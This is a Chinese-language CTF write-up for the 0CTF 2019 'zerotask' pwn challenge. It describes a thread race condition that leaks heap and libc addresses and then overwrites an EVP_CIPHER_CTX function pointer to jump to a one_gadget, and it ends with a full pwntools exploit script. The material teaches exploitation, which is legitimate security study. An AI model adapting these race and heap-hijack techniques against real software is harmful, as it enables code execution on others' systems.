> 原文链接: https://www.anquanke.com//post/id/175401 


# 0CTF 2019 zero_task条件竞争利用


                                阅读量   
                                **259332**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">6</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t016bbd6619ae01a1b0.png)](https://p1.ssl.qhimg.com/t016bbd6619ae01a1b0.png)



## 1.前言

0CTF2019 pwn题zerotask，难度在pwn题里最低，漏洞类型条件竞争。



## 2.题目保护

[![](https://p1.ssl.qhimg.com/t014330714b6fc17e69.png)](https://p1.ssl.qhimg.com/t014330714b6fc17e69.png)

全保护开启



## 3.题目功能

题目实现了一个加密解密的功能，共有三个功能项。

[![](https://p5.ssl.qhimg.com/t0198c0a059bad9f020.png)](https://p5.ssl.qhimg.com/t0198c0a059bad9f020.png)

1.创建任务 2.删除任务 3.执行任务

### <a class="reference-link" name="a.%E5%88%9B%E5%BB%BA%E4%BB%BB%E5%8A%A1"></a>a.创建任务

[![](https://p4.ssl.qhimg.com/t0139d6d6af07632e61.png)](https://p4.ssl.qhimg.com/t0139d6d6af07632e61.png)

该功能创建一个0x80大小的结构体。暂时命名为task

task`{`+0x00, data +0x08, data_size<br>
+0x14 ,KEY +0x34 IV<br>
……..<br>
+0x58 EVP_CIPHER_CTX<br>
+0x60 task_id +0x68 单链表指针<br>
`}`

[![](https://p2.ssl.qhimg.com/t01a392f67620fc85d7.png)](https://p2.ssl.qhimg.com/t01a392f67620fc85d7.png)

要求输入为task_id(任务id)，加密或解密,KEY(32字节)，IV(16字节)，DATA_SIZE(要加密或解密的数据长度)，DATA（要加密或解密的数据）。

会根据DATA_SIZE malloc出对应大小的空间。DATA_SIZE&lt;4096

同时EVP_CIPHER_CTX_new（）函数会创建一个EVP_CIPHER_CTX 对象。

功能1，会顺序创建四个堆块。

结构体task 0x80大小

EVP_CIPHER_CTX 对象，0xb0大小

EVP_CIPHER_CTX 对象创建的堆块 0x110大小。

根据DATA_SIZE分配的堆块。大小&lt;0x1000

### <a class="reference-link" name="b.%E5%88%A0%E9%99%A4%E4%BB%BB%E5%8A%A1"></a>b.删除任务

根据task_id及单链表删除指定结构体。

[![](https://p5.ssl.qhimg.com/t01ac454f276b3ae4fa.png)](https://p5.ssl.qhimg.com/t01ac454f276b3ae4fa.png)

### <a class="reference-link" name="c.%E6%89%A7%E8%A1%8C%E4%BB%BB%E5%8A%A1"></a>c.执行任务

根据task_id寻找到对应task结构，并根据task结构实现加密或解密，加密或解密后的数据保存在提前定义好的一处堆块中。

输出加密或解密后的内容。调用限制三次

[![](https://p1.ssl.qhimg.com/t01dd82822a2cc00542.png)](https://p1.ssl.qhimg.com/t01dd82822a2cc00542.png)

[![](https://p4.ssl.qhimg.com/t012eb94abc8f8d8a51.png)](https://p4.ssl.qhimg.com/t012eb94abc8f8d8a51.png)

线程启动后sleep(2).存在明显的条件竞争问题。



## 3.地址泄露

通过条件竞争实现地址泄露。

执行任务线程传入参数为task结构体地址。

利用思路：例如 提前free掉task2。调用功能3加密task1.在线程sleep期间，free掉task1.task1结构会进入tcache链表，+0x00的位置会被改写为另一个提前free的task2结构。同时若task1

中的DATA_SIZE足够大，则会将task2的结构内容及EVP_CIPHER_CTX 对象，EVP_CIPHER_CTX 对象创建的堆块，根据task2，DATA_SIZE分配的堆块全部加密输出。

将输出再重新新建一个任务保持相同密钥解密，可以实现地址泄露。

利用难点及克服方法:

1.程序给的libc为2.27版本，存在tcache机制，泄露时要求task结构体free后进入tcache链表，根据DATA_SIZE分配的堆块进入unsorted_bin链表。由于只有一次泄露<br>
的机会必须将heap地址和libc地址一并泄露。分配方法，DATA_SIZE设置为0x110同EVP_CIPHER_CTX 对象创建的堆块大小一致，创建4个后释放。此时共释放了4个0x80<br>
大小堆块。8个0x110大小堆块。

2.如上例再free task1后EVP_CIPHER_CTX 对象会被释放。导致加密出现异常。若重新创建任务会导致task1结构体被重新malloc。克服方法。

free(1)<br>
free(2)<br>
free(3)<br>
ad(0xa0)<br>
ad(0x8)

EVP_CIPHER_CTX 对象为0xb0大小，共创建了2个0x80结构，3个0xb0结构。此时task1结构未被malloc，里面的EVP_CIPHER_CTX 对象被重新创建。

[![](https://p5.ssl.qhimg.com/t016b22b50ad792b44e.png)](https://p5.ssl.qhimg.com/t016b22b50ad792b44e.png)

EVP_CipherUpdate为加密函数。rdi为EVP_CIPHER_CTX对象，rcx为被加密数据的堆块。r8为加密大小。可以看到加密数据中已包含堆地址及libc地址。

[![](https://p4.ssl.qhimg.com/t011abea047e4eea365.png)](https://p4.ssl.qhimg.com/t011abea047e4eea365.png)

[![](https://p5.ssl.qhimg.com/t0176e44699d03cf4bd.png)](https://p5.ssl.qhimg.com/t0176e44699d03cf4bd.png)



## 4.代码执行

有了libc地址需要找到办法控制程序流程跳转到one_gadget，但是程序功能中未找到可用的内存写功能。加密及解密的数据都放在了一个提前定义好的堆块中。

条件竞争并不能帮助我们写地址。

通过追踪程序加密函数EVP_CipherUpdate,根据EVP_CIPHER_CTX 对象+0x10数据判断加密还是解密。

[![](https://p0.ssl.qhimg.com/t011e5b59e63e33604f.png)](https://p0.ssl.qhimg.com/t011e5b59e63e33604f.png)

我选择跟进加密流程EVP_EncryptUpdate。里面有一处相对调用。这里将EVP_CIPHER_CTX +0x0结构随意命名为E。

程序会调用E结构+0x20处的指，前提是通过test，[e+0x12],0x10。利用方法就一目了然了，通过条件竞争重新分配EVP_CIPHER_CTX对象，使其E结构指向一处堆块。

在堆块中布局使[E+0x20]指向one_gadget即可完成利用。

free（1）<br>
free(2)<br>
ad(‘0xa0’)

[![](https://p2.ssl.qhimg.com/t019b53f253055ca0cb.jpg)](https://p2.ssl.qhimg.com/t019b53f253055ca0cb.jpg)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/0ctf2019/13.png)

## 5.脚本

```
from pwn import *
import time
p=process('./task')
e=ELF('./libc-2.27.so')
#p=remote('111.186.63.201',10001)
p.readuntil('Choice:')
context(log_level='debug')


def ad(a,b,c,d,e,f):
    p.writeline('1')
    p.readuntil('Task id :')
    p.writeline(a)
    p.readuntil('Encrypt(1) / Decrypt(2):')
    p.writeline(b)
    p.readuntil('Key :')
    p.write(c)
    p.readuntil('IV :')
    p.write(d)
    p.readuntil('Data Size :')
    p.writeline(e)
    p.readuntil('Data')
    p.write(f)
    p.readuntil('Choice:')
def de(a):
    p.writeline('2')
    p.readuntil('Task id :')
    p.writeline(a)
    p.readuntil('Choice:')
def go(a):
    p.writeline('3')
    p.readuntil('Task id :')
    p.writeline(a)
    p.readuntil('Choice:')

for i in range(0,4):
    ad(str(i),'1','a'*32,'a'*16,'256','1'*256)


ad('20','1','a'*32,'a'*16,'592','1'*592)
ad('21','1','a'*32,'a'*16,'8','1'*8)
ad('22','1','a'*32,'a'*16,'8','1'*8)
ad('23','1','a'*32,'a'*16,'8','1'*8)
ad('24','1','a'*32,'a'*16,'8','1'*8)
for i in range(0,4):
    de(str(i))

go('20')
de('20')

de('21')
de('22')
ad('21','1','a'*32,'a'*16,'160','1'*160)
ad('22','1','a'*32,'a'*16,'8','1'*8)
p.readuntil('Ciphertext: n')

st=''

for i in range(0,38):
    q=0



    for ii in range(0,16):
            zzz=p.read(3)

            zz=chr(int(zzz[0:2],16))


            st+=zz
            if 'n'in zzz:
                q=1
                break
    if q==0:
        p.read(1)        



ad('66','2','a'*32,'a'*16,str(len(st)),st)
go('66')
p.readuntil('Ciphertext: n')

z=p.readuntil('20 ')
z=chr(0x20)
for i in range(0,7):
    z+=chr(int(p.read(3)[0:2],16))
heap=u64(z)-0x980+0x7b0+0x100-0x850+0x10a0
p.readuntil('11 01 ')
z=p.readuntil('na0 ')
z=chr(0xa0)
for i in range(0,7):
    z+=chr(int(p.read(3)[0:2],16))

libc=u64(z)-4111776
one=libc+0x10a38c
success(hex(libc))
success(hex(heap))




gdb.attach(p)

go('22')
de('22')
de('23')



ad('23','1','a'*32,'a'*16,'160',p64(heap)+'1'*120+p64(one)*4)

success(hex(heap))

success(hex(libc))

p.interactive()
```
